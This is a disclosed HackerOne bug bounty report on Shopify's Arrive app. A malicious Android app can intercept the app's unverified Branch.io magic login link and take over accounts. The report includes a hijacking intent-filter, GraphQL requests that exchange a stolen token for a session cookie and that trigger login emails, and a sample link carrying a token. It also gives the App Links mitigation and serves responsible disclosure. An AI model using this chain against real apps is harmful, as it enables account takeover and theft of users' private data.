# Account takeover intercepting magic link for Arrive app

## Report Details
- **Report ID**: 855618
- **URL**: https://hackerone.com/reports/855618
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-04-22T01:06:10.829Z
- **Disclosed**: 2020-07-15T21:30:26.324Z

## Reporter
- **Username**: nsl182
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
### Summary

The "magic link" used for login by Arrive app uses Branch.io to pass the login token via deeplink to the app. But the URL contained in the link (app.link domain) is not verified so it can be intercepted by a malicious app at takeover the account.

### Description

When trying to login with Arrive app the user needs to request a login email to continue the login process. The user receives an email with a button to "Confirm the Email Address" that point to an URL of this kind:

https://qvay.app.link/R3DvpIJKtR?%24uri_redirect_mode=2&token=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa&secret=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa

This URL belong to branch.io and it will generate a chrome deeplink that will open Arrive app passing the token (visible in the URL) and continue the login flow.

This domain (qvay.app.link) is not verified by the app via App Link, so it can be listened by any malicious app when a use tries to open a link to it.

You can see that the `assetlinks.json` of that domain is empty: https://qvay.app.link/.well-known/assetlinks.json
It can be configured to prevent these type of attacks. More info here: https://help.branch.io/using-branch/docs/android-app-links

### Exploit

A malicious app can create an `intent-filter` to listen to that domain like this:

```
<intent-filter>
	<action android:name="android.intent.action.VIEW" />
	<category android:name="android.intent.category.DEFAULT" />
	<category android:name="android.intent.category.BROWSABLE" />
	<data android:scheme="https" />
	<data android:host="qvay.app.link" />
</intent-filter>
```

After the link is intercepted, we have a token we can Verify in order to get a `_arrive-server_session` cookie

For this we can do a POST request similar to this:

```
POST /graphql HTTP/1.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Cookie: _arrive-server_session=2a969ef15e1cc286ca6c5a88433d7173
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nexus 5X Build/OPM7.181105.004)
Host: arrive-server.shopifycloud.com
Connection: close
Content-Length: 346

{"operationName":"VerifyToken","variables":{"token":"TOKENHERE"},"query":"mutation VerifyToken($token: String!) {\n  verifyToken(token: $token) {\n    user {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

The response will include a valid `_arrive-server_session` cookie we can use to access other parts of the app and pretty much taking over the account.

### Bonus

The malicious app doesn't even have to wait for the user to request a login email, it can trigger it by itself (considering it know the emails, but thats doable checking the email accounts of the phone via Android SDK)

To request an email the malicious app can request this way:

```
POST /graphql HTTP/1.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nexus 5X Build/OPM7.181105.004)
Host: arrive-server.shopifycloud.com
Connection: close
Content-Length: 293

{"operationName":"SendVerificationEmail","variables":{"email":"EMAILHERE"},"query":"mutation SendVerificationEmail($email: String!) {\n  sendVerificationEmail(email: $email) {\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

Not only it will create the email, but also will give us a `_arrive-server_session` cookie in the response that we can use for the previous step when we are validating the token.

### Mitigation

In order to prevent a malicious app to take advantage of this exploit it will require to implement the App Links  verification for the `http://qvay.app.link` domain, and verify that link in the `AndroidManifest.xml` of the app. Steps are here: https://help.branch.io/using-branch/docs/android-app-links

### PoC and Video

Attached can be found a video where i explain both scenarios:
- User requests email via Arrive app and the malicious app intercepts the link opening and obtains a valid session cookie
- Malicious app requests the email and intercepts the link when the user finally opens it. 

Also attached is the `.apk` of the "malicious" app i used as PoC and for the video. Can provide sources if needed, but pretty much all the requests i'm making are explained here.

#### Reference material
https://www.nowsecure.com/blog/2019/04/05/how-to-guard-against-mobile-app-deep-link-abuse/
https://developer.android.com/training/app-links/verify-site-associations

## Impact

The account is compromised and the malicious app can potentially access private data like location, etc...

## Attachments
- arrive-exploit.apk
- arrive.mp4
